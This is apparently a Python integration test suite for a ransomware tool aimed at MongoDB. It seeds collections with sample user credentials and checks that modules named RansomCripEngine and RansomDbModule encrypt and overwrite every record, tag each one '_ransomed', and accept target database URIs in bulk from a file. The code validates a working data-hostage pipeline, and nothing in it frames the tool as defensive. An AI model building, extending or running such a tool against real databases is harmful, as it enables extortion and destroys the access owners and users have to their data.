import os
import hashlib
import pytest

os.environ.setdefault("KEY_CRIP_DATA", "integration-test-key-2026")

from cryptography.hazmat.primitives.ciphers.aead import AESGCM



MONGO_URI = os.getenv(
    "MONGO_TEST_URI",
    "mongodb://root:testpass123@localhost:17017/testdb?authSource=admin"
)

_NONCE_LEN = 12


def _can_connect_mongo() -> bool:
    try:
        from pymongo import MongoClient
        client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=3000)
        client.admin.command("ping")
        client.close()
        return True
    except Exception:
        return False


def _decrypt(blob: bytes) -> bytes:
    key_bytes = hashlib.sha256(
        os.getenv("KEY_CRIP_DATA", "").encode("utf-8")
    ).digest()
    aesgcm = AESGCM(key_bytes)
    nonce = blob[:_NONCE_LEN]
    ct_and_tag = blob[_NONCE_LEN:]
    return aesgcm.decrypt(nonce, ct_and_tag, None)


skip_no_mongo = pytest.mark.skipif(
    not _can_connect_mongo(),
    reason="MongoDB não disponível em localhost:17017"
)



@skip_no_mongo
class TestRansomMongo:

    @pytest.fixture(autouse=True)
    def setup_collection(self):
        from pymongo import MongoClient

        client = MongoClient(MONGO_URI)
        db = client.get_default_database()
        collection = db["data"]

        collection.drop()
        collection.insert_many([
            {"username": "alice",   "password": "secret123",  "email": "alice@corp.com"},
            {"username": "bob",     "password": "hunter2",    "email": "bob@corp.com"},
            {"username": "carol",   "password": "p@ssw0rd",   "email": "carol@corp.com"},
            {"username": "dave",    "password": "qwerty",     "email": "dave@corp.com"},
            {"username": "eve",     "password": "letmein",    "email": "eve@corp.com"},
        ])

        yield collection

        collection.drop()
        client.close()

    def test_mongo_adapter_connects(self):
        from infra.adapters.nosql.MongoAdapter import MongoAdapter

        adapter = MongoAdapter(MONGO_URI)
        records = adapter.list_records()

        assert len(records) == 5
        usernames = [r["username"] for r in records]
        assert "alice" in usernames
        assert "bob" in usernames

    def test_mongo_adapter_list_has_ids(self):
        from infra.adapters.nosql.MongoAdapter import MongoAdapter

        adapter = MongoAdapter(MONGO_URI)
        records = adapter.list_records()

        for r in records:
            assert "_id" in r

    def test_encrypt_and_overwrite_single_record(self):
        from infra.adapters.nosql.MongoAdapter import MongoAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = MongoAdapter(MONGO_URI)
        engine  = RansomCripEngine()
        records = adapter.list_records()

        encrypted_blobs = []
        engine.execute(lambda enc: encrypted_blobs.append(enc), [records[0]])

        adapter.overwrite(0, encrypted_blobs[0])

        from pymongo import MongoClient
        client = MongoClient(MONGO_URI)
        db = client.get_default_database()
        doc = db["data"].find_one({"_id": adapter._ids[0]})

        assert doc is not None
        assert "_encrypted" in doc
        assert doc["_ransomed"] is True

        encrypted_hex = doc["_encrypted"]
        encrypted_bytes = bytes.fromhex(encrypted_hex)
        decrypted = _decrypt(encrypted_bytes)

        import json
        original = json.loads(decrypted)
        assert original["username"] == "alice"

        client.close()

    def test_encrypt_all_records(self, setup_collection):
        from infra.adapters.nosql.MongoAdapter import MongoAdapter
        from infra.service.RansomCripEngine import RansomCripEngine

        adapter = MongoAdapter(MONGO_URI)
        engine  = RansomCripEngine()
        records = adapter.list_records()

        assert len(records) == 5

        index = [0]
        def write_fn(enc: bytes) -> None:
            adapter.overwrite(index[0], enc)
            index[0] += 1

        engine.execute(write_fn, records)

        assert index[0] == 5

        from pymongo import MongoClient
        client = MongoClient(MONGO_URI)
        db = client.get_default_database()

        encrypted_docs = list(db["data"].find({"_ransomed": True}))
        assert len(encrypted_docs) == 5

        usernames_recovered = []
        for doc in encrypted_docs:
            blob = bytes.fromhex(doc["_encrypted"])
            decrypted = _decrypt(blob)
            import json
            data = json.loads(decrypted)
            usernames_recovered.append(data["username"])

        assert sorted(usernames_recovered) == ["alice", "bob", "carol", "dave", "eve"]

        client.close()

    def test_full_ransomdb_pipeline(self, setup_collection):
        from infra.modules.RansomDbModule import RansomDbModule

        logs = []
        module = RansomDbModule(broadcast=lambda dto: logs.append(dto))

        count = module._run_nosql("MongoDB", MONGO_URI)

        assert count == 5

        from pymongo import MongoClient
        client = MongoClient(MONGO_URI)
        db = client.get_default_database()
        ransomed = db["data"].count_documents({"_ransomed": True})
        assert ransomed == 5
        client.close()

    def test_invalid_uri_fails(self):
        from infra.adapters.nosql.MongoAdapter import MongoAdapter

        with pytest.raises(Exception):
            MongoAdapter("mongodb://nonexistent:27017/db")


@skip_no_mongo
class TestRansomMongoFromFile:

    @pytest.fixture(autouse=True)
    def setup(self):
        from pymongo import MongoClient

        client = MongoClient(MONGO_URI)
        db = client.get_default_database()
        collection = db["data"]
        collection.drop()
        collection.insert_many([
            {"key": f"value_{i}", "secret": f"token_{i}"}
            for i in range(20)
        ])
        yield
        collection.drop()
        client.close()

    def test_read_uris_from_file_format(self):
        from infra.modules.RansomDbModule import RansomDbModule

        module = RansomDbModule(broadcast=lambda _: None)

        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("# Comentário\n")
            f.write(MONGO_URI + "\n")
            f.write("\n")
            f.write("# Outra URI\n")
            path = f.name

        try:
            uris = module._resolve_uris("file", {"file_path": path})
            assert len(uris) == 1
            assert uris[0] == MONGO_URI
        finally:
            os.unlink(path)

    @pytest.mark.asyncio
    async def test_encrypt_via_handle_ransom_db(self):
        from infra.modules.RansomDbModule import RansomDbModule

        logs = []
        module = RansomDbModule(broadcast=lambda dto: logs.append(dto))

        result = await module._handle_ransom_db({
            "db": "MongoDB",
            "mode": "single",
            "uri": MONGO_URI,
        })

        assert result.success is True
        data = result.data
        assert data["encrypted"] == 20
        assert data["db"] == "MongoDB"
